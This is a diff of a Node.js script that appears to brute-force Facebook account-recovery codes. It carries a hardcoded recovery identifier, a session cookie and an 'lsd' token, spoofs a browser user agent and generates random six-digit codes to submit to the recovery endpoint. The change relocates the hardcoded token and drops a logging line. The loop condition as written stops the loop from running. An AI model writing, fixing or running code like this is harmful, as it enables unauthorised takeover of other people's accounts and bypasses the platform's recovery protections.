@@ -14,6 +14,7 @@ const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, l
 
 (async () => {
   const cuid = 'AYio3bhMewAUhanbQTO8t_pTE3ocmDBOjVIa06vpQmNVR6ThpdQ9HrxYVw7yPTkFHNxHxNii8VTKznoVWU38-Tb4F9IKNe4Eus5PJ_xDTeSQ6BWl9UZeqLZTsgZULMKWclC9BMx-K9C83Ya9Ajv-LYbw7ptjvR9B_L48s74PGdLrsBQOGeuGiLmyV5JPs6L1W67vQmdYklomcJ47ThcZ6wS71C8DCzoA4pY6wzhMhJDdOzgpXtxSrlqtUGTurJUGV_n6vkLnJYReiGm7y4hmL5WoSnmags3wvnXOc1qTrQTngQ';
+  const lsd = 'AVpc27UCK1s';
   const url = 'https://www.facebook.com/recover/code/?cuid='+cuid;
   const headers = {
     'Cookie': 'datr=F_YuaFQVmcfePVvsUJJtDvkK',
@@ -25,9 +26,6 @@ const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, l
 
   // child_process.exec('siren warn');
 
-  // const lsd = helpers.randomString(11);
-  const lsd = 'AVpc27UCzBs';
-  log(lsd);
   const p = [];
   for (let i = 0, code; 0 > i; ++i) {
     code = rand(111111, 999999);
